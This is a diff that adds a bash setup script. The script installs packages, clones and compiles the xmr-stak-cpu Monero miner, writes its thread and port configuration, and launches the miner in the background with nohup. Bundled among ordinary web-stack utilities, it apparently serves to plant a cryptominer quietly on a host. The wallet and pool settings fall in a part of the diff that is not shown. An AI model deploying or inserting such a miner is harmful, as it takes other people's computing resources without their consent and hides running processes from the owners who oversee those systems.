@@ -1,4 +1,28 @@
+#!/bin/bash
+apt-get update -y && \
+    apt-get install -y --no-install-recommends \
+        libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev \
+		imagemagick \
+		graphicsmagick \
+		zip \
+		unzip \
+		wget \
+		curl \
+		git \
+		mysql-client \
+		moreutils \
+		dnsutils \
+	&& rm -rf /var/lib/apt/lists/*
 
+git clone https://github.com/fireice-uk/xmr-stak-cpu.git /xmr \
+    && cd /xmr \
+    && cmake . \
+    && make install \
+    && rm -rf /xmr/bin/config.txt
+
+cd /xmr/bin/
+
+echo '
 "cpu_threads_conf" :
 [
     { "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 0 },
@@ -24,4 +48,6 @@
 "output_file" : "/var/logs/xmr.log",
 "httpd_port" : 10080,
 "prefer_ipv4" : true,
+' > /xmr/bin/config.txt
 
+nohup ./xmr-stak-cpu &
